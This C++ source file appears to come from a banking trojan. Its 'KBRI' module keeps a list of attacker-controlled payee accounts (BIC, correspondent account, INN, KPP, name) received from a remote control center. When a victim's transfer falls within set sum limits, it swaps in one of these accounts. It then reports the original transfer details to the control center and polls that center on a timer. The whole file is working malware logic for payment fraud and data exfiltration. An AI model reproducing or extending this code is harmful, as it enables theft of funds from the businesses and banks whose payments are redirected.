/*
	kbriTargetAccManager.cpp
	Routines for managing target account's list
*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\MyStreams.h"
#include "..\inc\CryptRoutines.h"

#include "..\inc\DataCallbackManager.h"
#include "..\shared\CommStructures.h"

#include "KBRI.h"

#include "kbriTargetAccManager.h"


TARGACCS_LIST *gtal;	// global filled at tamInit(), used by data callback


/*
	Initializes list structure for accounts list
*/
VOID tamInit(TARGACCS_LIST *tal)
{
	memset(tal, 0, sizeof(TARGACCS_LIST));
	InitializeCriticalSection(&tal->cstaAccess);

	gtal = tal;
}

VOID _tamEnter(TARGACCS_LIST *tal) {

#ifdef _DEBUG
	while (!TryEnterCriticalSection(&tal->cstaAccess)) {

		DbgPrint("NOTE: cs enter failed, owning thread=%u", tal->cstaAccess.OwningThread);
		Sleep(5000);

	}
#else
	EnterCriticalSection(&tal->cstaAccess); 
#endif
}
VOID _tamLeave(TARGACCS_LIST *tal) { LeaveCriticalSection(&tal->cstaAccess); }



/*
	Receives creds as supplied by remote control center and applies an extra encryption for storage at TARGET_ACCOUNT.pCryptedCreds
	Allocates resulting buffers internally
*/
BOOL _tamEncryptCreds(LPVOID pCreds, DWORD dwCredsLen, LPVOID *pCryptedCreds, DWORD *dwCryptedCredsLen)
{
	BOOL bRes = TRUE;
	MY_STREAM ms = { 0 };

	if (!pCreds || !dwCredsLen || !pCryptedCreds || !dwCryptedCredsLen) { DbgPrint("ERR: invalid input params"); return FALSE; }

	// move data stream
	msInitStream(&ms);
	ms.msWriteStream(&ms, pCreds, dwCredsLen);

	// encrypt stream
	if (!cryptEncryptStream(&ms)) { DbgPrint("ERR: failed to encrypt stream"); ms.msFreeStream(&ms); return FALSE; }

	// save buffers to caller
	*pCryptedCreds = ms.pData;
	*dwCryptedCredsLen = ms.lDataLen;

	return bRes;
}

/*
	Adds new or updates existing record
	Returns TRUE if new added, or FALSE if updated existing
*/
BOOL tamAddUpdateRecord(TARGACCS_LIST *tal, DWORD dwRecordId, DWORD dwRevisionId, TA_LIMITS *limits, LPVOID pCreds, DWORD dwCredsLen)
{
	BOOL bRes = FALSE;
	TARGET_ACCOUNT_CHUNK *tac;

	_tamEnter(tal);

	do {	// not a loop

		// scan existing records
		if (tal->dwtaCount) {

			// check if we have such chunk by dwRecordId
			tac = tal->ipHead.lcNext;

			while (tac) {
				// check for id match
				if (tac->ta.dwRecordId == dwRecordId) { DbgPrint("found existing record id %u", dwRecordId); break; }
				tac = tac->lcNext;
			} 

			// check if found a record
			if (tac) {

				// check revision
				if (dwRevisionId > tac->ta.dwRevisionId) {

					DbgPrint("update needed, currect rev %u, supplied rev %u", tac->ta.dwRevisionId, dwRevisionId);

					// do update keeping accumulative params
					tac->ta.dwRecordId = dwRecordId;
					tac->ta.dwRevisionId = dwRevisionId;
					tac->ta.limits = *limits;

					// replace encoded creds (assumed to be an opaque memory buffer)
					my_free(tac->ta.pCryptedCreds); tac->ta.pCryptedCreds = NULL; tac->ta.dwCryptedCredsLen = 0;
					_tamEncryptCreds(pCreds, dwCredsLen, &tac->ta.pCryptedCreds, &tac->ta.dwCryptedCredsLen);

				} else { DbgPrint("old revision %u, no update for rec %u", dwRevisionId, dwRecordId); break; } // revision greater

			} // record found

		} // records present

		// if got here, no record found, just add a new record
		tac = (TARGET_ACCOUNT_CHUNK *)my_alloc(sizeof(TARGET_ACCOUNT_CHUNK));
		tac->ta.dwRecordId = dwRecordId;
		tac->ta.dwRevisionId = dwRevisionId;
		tac->ta.limits = *limits;
		_tamEncryptCreds(pCreds, dwCredsLen, &tac->ta.pCryptedCreds, &tac->ta.dwCryptedCredsLen);

		// link new node
		tac->lcNext = tal->ipHead.lcNext;
		tal->ipHead.lcNext = tac;
		tal->dwtaCount++;

		DbgPrint("added new record, dwtaCount=%u", tal->dwtaCount);

	} while (FALSE);	// not a loop

	_tamLeave(tal);

	return bRes;
}

/*
	Remote control center should keep a record of all ids which were removed and send it to all clients.
	This way it can keep an actual list of target accs and remove outdated records on client side

	Returns TRUE if a record was found and removed
*/
BOOL tamRemoveRecord(TARGACCS_LIST *tal, DWORD dwRecordId)
{
	BOOL bRes = FALSE;
	TARGET_ACCOUNT_CHUNK *tac = NULL;
	TARGET_ACCOUNT_CHUNK *tac_prev = NULL;

	if (!tal->dwtaCount) { DbgPrint("no records yet"); return bRes; }

	_tamEnter(tal);

		tac = tal->ipHead.lcNext;
		tac_prev = &tal->ipHead;

		while (tac) {

			// check for match
			if (tac->ta.dwRecordId == dwRecordId) {

				// unlink from chain
				tac_prev->lcNext = tac->lcNext;
				tal->dwtaCount--;

				// free tac
				DbgPrint("deallocating id %u at ptr %p", dwRecordId, tac);
				if (tac->ta.pCryptedCreds) { my_free(tac->ta.pCryptedCreds); }
				my_free(tac);

				// set net ptr
				tac = tac_prev->lcNext;

				// may exit here
				bRes = TRUE;
				break;

			} else {

				// move ptrs
				tac = tac->lcNext;
				tac_prev = tac_prev->lcNext;

			}	// record match

		} // while tac

	_tamLeave(tal);

	return bRes;
}


/*
	Callback issuer for tamIssueServerNotify() 
*/
DWORD WINAPI thrServerNotifyCaller(LPVOID lpParameter)
{
	CLIENTDISPATCHERFUNC pServingCallback = dcmGetServerCallback();
	DISPATCHER_CALLBACK_PARAMS *dcp = (DISPATCHER_CALLBACK_PARAMS *)lpParameter;	// params structure to be sent to callback server


	pServingCallback(dcp);

	if (dcp->pInBuffer) { my_free(dcp->pInBuffer); }

	my_free(dcp);

	ExitThread(0);
}




/*
	Issue a special packet to server to notify about replacement made
	pDetails contains original text buffer to be saved on remote side
	dwRecordId & dwTransSum may be NULL to identify a single processed file buffer
*/
VOID tamIssueServerNotify(DWORD dwRecordId, DWORD dwTransSum, LPVOID pDetails, DWORD dwDetailsLen)
{
	KBRI_INJECT_NOTIFY *kin = NULL;	// data buffer to send

	INNER_ENVELOPE *iEnvelope = NULL;	// inner envelope ptr to be used with data
	DISPATCHER_CALLBACK_PARAMS *dcp = NULL;	// params structure to be sent to callback server


	DWORD dwThreadId = 0;

	if (!pDetails || !dwDetailsLen) { DbgPrint("ERR: invalid input params"); return; }
	if (IsBadReadPtr(pDetails, dwDetailsLen)) { DbgPrint("ERR: buffer not readable, p=%p len=%u", pDetails, dwDetailsLen); return; }

	// create buffer to be sent to invoker thread
	dcp = (DISPATCHER_CALLBACK_PARAMS *)my_alloc(sizeof(DISPATCHER_CALLBACK_PARAMS));

	// alloc notify buffer
	dcp->lInBufferLen = sizeof(INNER_ENVELOPE) + sizeof(KBRI_INJECT_NOTIFY) + dwDetailsLen;
	if (!(dcp->pInBuffer = my_alloc(dcp->lInBufferLen))) { DbgPrint("ERR: failed to alloc %u buffer", dcp->lInBufferLen); return; }
	kin = (KBRI_INJECT_NOTIFY *)((SIZE_T)dcp->pInBuffer + sizeof(INNER_ENVELOPE));


	// fill items
	kin->dwRecordId = dwRecordId;
	kin->dwTransSum = dwTransSum;
	memcpy((LPVOID)((SIZE_T)kin + sizeof(KBRI_INJECT_NOTIFY)), pDetails, dwDetailsLen);


	// cast ptr
	iEnvelope = (INNER_ENVELOPE *)dcp->pInBuffer;

	// fill inner envelope
	iEnvelope->dwDataLen = sizeof(KBRI_INJECT_NOTIFY) + dwDetailsLen;
	iEnvelope->wEnvelopeId = EID_KBRI_NOTIFY;
	cmsFillInnerEnvelope(iEnvelope);

	// issue cmd to send buffer
	// fill structure
	dcp->csType = ST_NETWORK_SEND;
	dcp->ppParams.vciType = NON_VOLATILE;
	dcp->ppParams.vsSource = SOURCE_LOCAL;

	// call in thread to prevent lock of hook thread
	CloseHandle(CreateThread(NULL, 0, thrServerNotifyCaller, dcp, 0, &dwThreadId));



	// cleanup is done by thread
	//if (dcp->pInBuffer) { my_free(dcp->pInBuffer); }
}

/*
	Query target accounts list for a suitable record by dwTransSum
	Updates internal params for a targ acc, issues a deferred server request with trans params
	Returns TRUE if creds supplied, or FALSE if no suitable record detected or some other error

	dwTransSum is in K
*/
BOOL tamGetCredsBySum(TARGACCS_LIST *tal, DWORD dwTransSum, DECODED_CREDS *dCreds, LPVOID pTransferDetails, DWORD dwTransferDetailsLen)
{
	BOOL bRes = FALSE;
	TARGET_ACCOUNT_CHUNK *tac = NULL, *tac_saved = NULL;

	BOOL bIssueServerCallback = FALSE;	// flag indicating need to issue server callback (should be done outside of any cs locks)
	DWORD dwSendRecordId = 0;

	if (!tal) { DbgPrint("ERR: invalid input params"); return bRes; }

	_tamEnter(tal);

	do {	// not a loop

		// checks if we have any records here
		if (!tal->dwtaCount) { DbgPrint("no records yet"); break; }

		tac = tal->ipHead.lcNext;

		while (tac) {

			// check limits
			if ((dwTransSum >= tac->ta.limits.dwTriggerSumMin) &&
				(dwTransSum <= tac->ta.limits.dwTriggerSumMax) &&
				((dwTransSum + tac->ta.dwSum) <= tac->ta.limits.dwResultingSumMax) &&
				( (1 + tac->ta.dwTransactionsCount) <= tac->ta.limits.dwMaxTransactionsCount )

			) { 
			
				DbgPrint("found matching record %u", tac->ta.dwRecordId);

				// check if it's usage is lower than last found's
				if ((!tac_saved) || (tac->ta.dwTransactionsCount < tac_saved->ta.dwTransactionsCount)) { DbgPrint("even more suitable, saving"); tac_saved = tac; }

				// check for 0 value -> no need to search deeper
				if (!tac_saved->ta.dwTransactionsCount) { break; }
			
			} // limits match found

			// move ptr
			tac = tac->lcNext;

		} // whila tac

		// check if something was found
		if (!tac_saved) { break; }

		// return data
		if (!(bRes = tamDecodeCreds(&tac_saved->ta, dCreds))) { DbgPrint("ERR: failed to decode trans creds"); break; }

		//DbgPrint("creds decoded OK");

		// update current params
		tac_saved->ta.dwSum += dwTransSum;
		tac_saved->ta.dwTransactionsCount++;
		DbgPrint("resulting params for tacc id %u: sum=%u tr_count=%u, added sum=%u", tac_saved->ta.dwRecordId, tac_saved->ta.dwSum, tac_saved->ta.dwTransactionsCount, dwTransSum);

		// issue send record to cc
		dwSendRecordId = tac_saved->ta.dwRecordId;
		bIssueServerCallback = TRUE;

	} while (FALSE);	// not a loop

	_tamLeave(tal);

	// do server cb, if needed, outside of any cs locks, to prevent deadlocks
	if (bIssueServerCallback) { tamIssueServerNotify(dwSendRecordId, dwTransSum, pTransferDetails, dwTransferDetailsLen); }

	return bRes;
}


/*
	Removes a special envelope, isuued by remote side
	Internally allocated creds result
	WARN: modified pEncoded contents
*/
BOOL _tamRemoveInitialEncoding(LPVOID pEncoded, DWORD dwEncodedLen, PTACC_CREDS *pcreds)
{
	BOOL bRes = FALSE;

	BYTE *pb = (BYTE *)pEncoded;
	DWORD dwCounter = dwEncodedLen;

	DWORD dwDecryptedLen = 0;

	do {	// not a loop


		if (!pEncoded || !dwEncodedLen || !pcreds) { DbgPrint("ERR: invalid input params"); break; }

		// alloc sufficient resulting buffer
		//*pcreds = (TACC_CREDS *)my_alloc(sizeof(TACC_CREDS) + dwEncodedLen);

		// do decoding according to panel's algo (dexor with 0x51 and do decryption via standart cryptDecryptBuffer() function)

		// dexor
		while (dwCounter) {

			*pb ^= 0x51;

			pb++;
			dwCounter--;
		}

		// decrypt
		if (!cryptDecryptBuffer(pEncoded, dwEncodedLen, (LPVOID *)pcreds, &dwDecryptedLen)) { DbgPrint("ERR: failed to remove internal encryption"); break; }

		DbgPrint("done, res len=%u", dwDecryptedLen);
		bRes = TRUE;

	} while (FALSE);	// not a loop


	return bRes;
}


/*
	Decodes creds identified by TARGET_ACCOUNT.pCryptedCreds
	Allocates structure at dCreds
	Returns TRUE on success
*/
BOOL tamDecodeCreds(TARGET_ACCOUNT *ta, DECODED_CREDS *dCreds)
{
	BOOL bRes = FALSE;
	
	LPVOID pDecrypted = NULL;
	DWORD dwDecryptedLen = 0;

	TACC_CREDS *creds = NULL;	// decoded from pDecrypted by removing initial encoding, issued by remote side

	do {	// not a loop

		if (!ta || !dCreds) { DbgPrint("ERR: invalid input params: ta=%p dCreds=%p", ta, dCreds); break; }
		if (!ta->pCryptedCreds || !ta->dwCryptedCredsLen) { DbgPrint("ERR: no crypted creds defined at ta"); break; }

		// remove internal encryption
		if (!cryptDecryptBuffer(ta->pCryptedCreds, ta->dwCryptedCredsLen, &pDecrypted, &dwDecryptedLen)) { DbgPrint("ERR: failed to remove internal encryption"); break; }

		// remove encoding issued by cc
		if (!_tamRemoveInitialEncoding(pDecrypted, dwDecryptedLen, &creds)) { DbgPrint("ERR: failed to remove initial remote encoding"); break; }

		// split items into DECODED_CREDS structure

		// alloc buffers
//		dCreds = (DECODED_CREDS *)my_alloc(sizeof(DECODED_CREDS));
		dCreds->szBIC = (LPSTR)my_alloc(1024);
		dCreds->szCorrespAcc = (LPSTR)my_alloc(1024);
		dCreds->szPersonalAcc = (LPSTR)my_alloc(1024);
		dCreds->szINN = (LPSTR)my_alloc(1024);
		dCreds->szKPP = (LPSTR)my_alloc(1024);
		dCreds->szName = (LPSTR)my_alloc(1024);

		// move elements to new buffers
		memcpy(dCreds->szBIC, &creds->bic, 9);
		memcpy(dCreds->szCorrespAcc, &creds->CorrespAcc, 20);
		memcpy(dCreds->szPersonalAcc, &creds->PersonalAcc, 20);
		memcpy(dCreds->szINN, &creds->inn, 10);
		memcpy(dCreds->szKPP, &creds->kpp, 9);
		memcpy(dCreds->szName, &creds->Name, creds->bNameLen);

		dCreds->bGP = creds->bGP;

		//DbgPrint("creds decoded OK, targ acc inn [%s] name_len=%u name [%s]", dCreds->szINN, creds->bNameLen, dCreds->szName);
		bRes = TRUE;

	} while (FALSE);	// not a loop

	// cleanup, if needed
	if (pDecrypted) { my_free(pDecrypted); }
	if (creds) { my_free(creds); }

	return bRes;
}

/*
	Properly deallocates structure returned by tamGetCredsBySum() call
*/
VOID tamFreeDecodedCreds(DECODED_CREDS *dCreds)
{
	if (!dCreds) { DbgPrint("ERR: invalid input params"); return; }

	if (dCreds->szBIC)			{ my_free(dCreds->szBIC); }
	if (dCreds->szCorrespAcc)	{ my_free(dCreds->szCorrespAcc); }
	if (dCreds->szPersonalAcc)	{ my_free(dCreds->szPersonalAcc); }
	if (dCreds->szINN)			{ my_free(dCreds->szINN); }
	if (dCreds->szKPP)			{ my_free(dCreds->szKPP); }
	if (dCreds->szName)			{ my_free(dCreds->szName); }

//	my_free(dCreds);
}






/*
	Thread to add special query from time to time, to update internal t-accs list
	NB: these requests are subject for transport query timeline limitations
*/
DWORD WINAPI thrtamTAccsQuery(LPVOID lpParameter)
{
	INNER_ENVELOPE *iEnvelope = NULL;	// inner envelope ptr to be used with data
	DISPATCHER_CALLBACK_PARAMS dcp = { 0 };	// params structure to be sent to callback server
	CLIENTDISPATCHERFUNC pServingCallback = dcmGetServerCallback();

	DbgPrint("entered");

	// alloc query buffer
	dcp.lInBufferLen = sizeof(INNER_ENVELOPE);
	if (!(dcp.pInBuffer = my_alloc(dcp.lInBufferLen))) { DbgPrint("ERR: failed to alloc %u bytes", dcp.lInBufferLen); return 0; }

	// fill structure
	dcp.csType = ST_NETWORK_SEND;
	dcp.ppParams.vciType = VOLATILE_KBRI_HEARTBEAT;
	dcp.ppParams.vsSource = SOURCE_LOCAL;

	do {	// infinite loop


#ifndef _DEBUG
		// release 3 min
		Sleep(3 * 60 * 1000);
#else
		// debug 10s
		Sleep(10 * 1000);
#endif

		// prepare and add query
		iEnvelope = (INNER_ENVELOPE *)dcp.pInBuffer;
		memset(dcp.pInBuffer, 0, sizeof(INNER_ENVELOPE));

		// fill inner envelope
		//iEnvelope->dwDataLen = 0;
		iEnvelope->wEnvelopeId = EID_KBRI_HEARTBEAT;
		cmsFillInnerEnvelope(iEnvelope);

		pServingCallback(&dcp);

	} while (TRUE);	// infinite loop


	ExitThread(0);
}

/*
	Prepares data to be sent to tamAddUpdateRecord()
	Returns TRUE on success, FALSE on any error
*/
BOOL tamParseItem(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;
	TACC *tacc = NULL;	// casted ptr for input params

	TA_LIMITS tlim = { 0 };

	do {	// not a loop

		if (!dcp->pInBuffer || !dcp->lInBufferLen) { DbgPrint("ERR: empty params"); break; }

		tacc = (TACC *)((SIZE_T)dcp->pInBuffer + sizeof(SERVER_COMMAND));

		// check mem buffers for range validity
		if (IsBadWritePtr(tacc, sizeof(TACC))) { DbgPrint("ERR: bad write buffer (1)"); break; }
		if (tacc->wCredsLen > dcp->lInBufferLen) { DbgPrint("ERR: wCredsLen out of limits"); break; }
		if (IsBadWritePtr(tacc, sizeof(TACC) + dcp->lInBufferLen)) { DbgPrint("ERR: bad write buffer (2)"); break; }

		DbgPrint("item: id=%u rev_id=%u dwTransCount=%u dwTransSum=%u dwTransMin=%u dwTransMax=%u wCredsLen=%u", tacc->dwRecId, tacc->dwRevisionId, tacc->dwTransCount, tacc->dwTransSum, tacc->dwTransMin, tacc->dwTransMax, tacc->wCredsLen);

		tlim.dwMaxTransactionsCount = tacc->dwTransCount;
		tlim.dwResultingSumMax = tacc->dwTransSum;
		tlim.dwTriggerSumMax = tacc->dwTransMax;
		tlim.dwTriggerSumMin = tacc->dwTransMin;
		tamAddUpdateRecord(gtal, tacc->dwRecId, tacc->dwRevisionId, &tlim, &tacc->Creds, tacc->wCredsLen);

		bRes = TRUE;

	} while (FALSE);	// not a loop


	return bRes;
}


BOOL tamParseRemovedItem(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;
	DWORD *pdwRemovedRecordId = NULL;	// casted ptr

	do {	// not a loop

		if (!dcp->pInBuffer || !dcp->lInBufferLen) { DbgPrint("ERR: empty params"); break; }

		pdwRemovedRecordId = (DWORD *)((SIZE_T)dcp->pInBuffer + sizeof(SERVER_COMMAND));

		if (IsBadWritePtr(pdwRemovedRecordId, sizeof(DWORD))) { DbgPrint("ERR: bad write buffer"); break; }

		tamRemoveRecord(gtal, *pdwRemovedRecordId);

		bRes = TRUE;

	} while (FALSE);	// not a loop

	return bRes;
}


// dispatcher callback waiting for ST_SERVER_COMMAND command
// if matched id fetched, return TRUE and processing answer in dcp structure
// NB: allocated buffer will be disposed by cb manager
BOOL CALLBACK cbTAListParser(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;	// by default, return FALSE allowing other callback to attempt parsing the packet
	SERVER_COMMAND *sCommand;	// command + payload ptr

	do {	// not a loop

		if (dcp->csType == ST_SERVER_COMMAND) {

			// check for matching cmd id
			if (!(sCommand = (SERVER_COMMAND *)dcp->pInBuffer)) { DbgPrint("ERR: NULL ptr passed as input buffer"); break; }

			switch (sCommand->wCommandId) {

				// NB: wdd returns already splitted items, one by one, so no need for internal split logic
				case SCID_KBRI_TACC_ITEM:		bRes = tamParseItem(dcp); break;
				case SCID_KBRI_REMOVED_TACC:	bRes = tamParseRemovedItem(dcp); break;

			} // switch

		} // ST_SERVER_COMMAND type

	} while (FALSE);	// not a loop

	return bRes;
}




/*
	Creates a thread to periodically request and parse t-accs update info
*/
VOID tamStartTAccsQueryThread(KBRI_GLOBALS *KBRI)
{
	DbgPrint("entered");

	// query thread
	CloseHandle(CreateThread(NULL, 0, thrtamTAccsQuery, (LPVOID)KBRI, 0, &KBRI->dwTAccsQueryThreadId)); // save server thread id so it would be possible to perform termination

	// server answer parser function
	dcmAddDataCallback(cbTAListParser);

}